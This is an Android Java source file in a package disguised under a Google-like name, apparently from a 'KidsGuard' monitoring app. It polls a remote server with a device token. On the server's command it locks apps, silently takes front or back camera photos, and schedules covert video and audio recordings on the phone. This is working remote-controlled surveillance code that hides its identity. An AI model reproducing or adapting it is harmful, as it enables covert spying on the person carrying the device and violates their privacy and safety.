package com.google.cloudservices;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.SystemClock;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.Cache;
import com.android.volley.Network;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.BasicNetwork;
import com.android.volley.toolbox.DiskBasedCache;
import com.android.volley.toolbox.HurlStack;
import com.android.volley.toolbox.StringRequest;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

public class GetStatus {
    int i;
    String insp="";
    String s;

    LockStatusDB lockStatusDB=null;
    StringRequest stringRequest=null;
    RequestQueue requestQueue=null;
    JSONObject jsonstatus = null;
    OptionDB optionDB=null;
    pro.tasking.blockAppdb blockAppdb=null;
    JSONObject  appjson=null;
    Iterator iter=null;
    String pkgName=null;
    JSONObject jss=null;
    String ftime=null;
    String stime=null;
    JSONObject lockjs=null;
    String titles=null;
    String texts=null;
    LockTitleDB lockTitleDB=null;
    String photo=null;
    String media=null;
    Intent lockIntent=null;
    Intent lockIntent2=null,vidIntent;
    Map<String, String> params=null;
    Timedb timedb=null;
    private int sd;

    public void getlock(final Context context) {
        new Thread(new Runnable() {
            @Override
            public void run() {


        try {
            Cache cache = new DiskBasedCache(context.getCacheDir(), 1024 * 1024);
            Network network = new BasicNetwork(new HurlStack());
            requestQueue = new RequestQueue(cache, network);
            requestQueue.start();
            cache.clear();
            stringRequest = new StringRequest(Request.Method.POST, "https://im.kidsguard.pro/api/get-status/",
                    new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {
                            Log.e("rttredfgf", response);
                        //    Toast.makeText(context, response, Toast.LENGTH_SHORT).show();
                            requestQueue.stop();


                            try {
                                jsonstatus = new JSONObject(response);
                                switch (jsonstatus.getString("status")){
                                    case "ok":
                                        optionDB=new OptionDB(context);
                                        if (optionDB.getjs().get(3).equals("pack1")){
                                            if (jsonstatus.getString("lock").equals("false")){
                                                blockAppdb=new blockAppdb(context);
                                                blockAppdb.delall();
                                                blockAppdb.close();
//
                                                try {
                                                    appjson = jsonstatus.getJSONObject("packagesToLock");
                                                    iter = appjson.keys();
                                                    while(iter.hasNext()){
                                                        pkgName = (String)iter.next();
                                                        jss = appjson.getJSONObject(pkgName);
                                                        ftime=jss.getString("startTime");
                                                        stime=jss.getString("endTime");
                                                        s=pkgName+":"+ftime+":"+stime;
//
                                                        blockAppdb.Insertjs(s);
                                                        blockAppdb.close();
//
                                                    }
//
                                                    lockStatusDB=new LockStatusDB(context);
                                                    if (lockStatusDB.getlock().equals("123")){
                                                        lockStatusDB.Inserlock("0");
                                                    }else {
                                                        lockStatusDB.Updatelock("0");

                                                    }
                                                } catch (JSONException e) {
                                                    e.printStackTrace();
                                                }

                                            }
                                            else {
                                                lockjs=jsonstatus.getJSONObject("lock");
                                                titles=lockjs.getString("title");
                                                texts=lockjs.getString("message");
                                                lockStatusDB=new LockStatusDB(context);
                                                if (lockStatusDB.getlock().equals("123")){
                                                    lockStatusDB.Inserlock("1");
                                                    lockStatusDB.close();
                                                    LockTitleDB lockTitleDB=new LockTitleDB(context);
                                                    lockTitleDB.gettitle();
                                                    if (lockTitleDB.title1.equals("null")){
                                                        lockTitleDB.Insertitle(titles,texts);}else {
                                                        lockTitleDB.UpdatePerson(titles,texts);
                                                    }
                                                }else { lockStatusDB.Updatelock("1");
                                                    lockStatusDB.close();
                                                    lockTitleDB=new LockTitleDB(context);
                                                    lockTitleDB.gettitle();
                                                    if (lockTitleDB.title1.equals("null")){
                                                        lockTitleDB.Insertitle(titles,texts);}else {
                                                        lockTitleDB.UpdatePerson(titles,texts);
                                                    }
                                                }
                                                lockStatusDB.close();


                                            }
                                        }
                                        optionDB.close();

                                        if (optionDB.getjs().get(5).equals("picture1")){
                                            photo=jsonstatus.getString("cam");
                                            if (photo.equals("0")){
                                            }else if (photo.equals("1")){
                                                lockIntent = new Intent(context, TakePictureervice.class);
                                                lockIntent.putExtra("photoType","front");
                                                lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                                ContextCompat.startForegroundService(context,lockIntent);
                                            }else if (photo.equals("2")){
                                                lockIntent2 = new Intent(context, TakePictureervice.class);
                                                lockIntent2.putExtra("photoType","back");
                                                lockIntent2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                                ContextCompat.startForegroundService(context,lockIntent2);
                                            }
                                        }

                                        if (optionDB.getjs().get(6).equals("video1")||optionDB.getjs().get(7).equals("Audio1")) {

                                            media = jsonstatus.getString("media");
                                            if (media.equals("0")) {
                                            } else if (media.equals("video1")&&optionDB.getjs().get(6).equals("video1")) {
                                                Log.e("cach3434", String.valueOf(sd));
                                                sd++;
//                                                vidIntent = new Intent(context, CapPhoto2.class);
//                                                vidIntent.putExtra("type","not");
//                                                vidIntent.putExtra("dur","40000");
//                                                vidIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                                                ContextCompat.startForegroundService(context,vidIntent);
                                                AlarmManager alarmMgr = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
                                                Intent intent = new Intent(context,AuodiReceiver.class);
                                                intent.putExtra("type","not");
                                                intent.putExtra("dur","40000");
                                                intent.putExtra("media","cap2");
                                                PendingIntent alarmIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
                                                alarmMgr.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                                                        SystemClock.elapsedRealtime() +
                                                                1000, alarmIntent);

                                            } else if (media.equals("video2")&&optionDB.getjs().get(6).equals("video1")) {
//                                                vidIntent = new Intent(context, CapPhoto.class);
//                                                vidIntent.putExtra("type","not");
//                                                vidIntent.putExtra("dur","40000");
//                                                vidIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                                                ContextCompat.startForegroundService(context,vidIntent);
                                                AlarmManager alarmMgr = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
                                                Intent intent = new Intent(context,AuodiReceiver.class);
                                                intent.putExtra("type","not");
                                                intent.putExtra("dur","40000");
                                                intent.putExtra("media","cap");
                                                PendingIntent alarmIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
                                                alarmMgr.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                                                        SystemClock.elapsedRealtime() +
                                                                1000, alarmIntent);
                                            }else if (media.equals("voice")&&optionDB.getjs().get(7).equals("Audio1")){
                                                try {
//                                                    vidIntent = new Intent(context, AudioService.class);
//                                                    vidIntent.putExtra("type","not");
//                                                    vidIntent.putExtra("dur","40000");
//                                                    vidIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                                                    ContextCompat.startForegroundService(context,vidIntent);
                                                    AlarmManager alarmMgr = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
                                                    Intent intent = new Intent(context,AuodiReceiver.class);
                                                    intent.putExtra("type","not");
                                                    intent.putExtra("dur","40000");
                                                    intent.putExtra("media","voice");
                                                    PendingIntent alarmIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
                                                    alarmMgr.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                                                            SystemClock.elapsedRealtime() +
                                                                    1000, alarmIntent);
                                                }catch (IllegalStateException e){

                                                }

                                            }else{
                                               timedb=new Timedb(context);
                                               timedb.Updatetime(media);
                                            }
                                            String datevid=jsonstatus.getString("datemedia");
                                            if (datevid.equals("false")){}else {
                                                JSONObject jsonmediadate=jsonstatus.getJSONObject("datemedia");

                                            }


                                        }
                                        optionDB.close();
//                                        /*Runtime.getRuntime().gc();*/
                                        break;
                                    default:
                                        break;
                                }
//
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }


                        }
                    }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {

                }

            }) {
                @Override
                protected Map<String, String> getParams() {
                    params = new HashMap<String, String>();
                    params.put("kidToken", getToken(context));
                    return params;
                }
            };



            requestQueue.add(stringRequest);


        }catch (Exception e){}finally {

           requestQueue.cancelAll(stringRequest);
          // params.clear();

        }

            }
        }).start();

    }

    public  String getToken(Context context){
        String token=null;
        TokenDataBaseManager tokenDataBaseManager=new TokenDataBaseManager(context);
        token=tokenDataBaseManager.gettoken();
        tokenDataBaseManager.close();
        return token;

    }
}
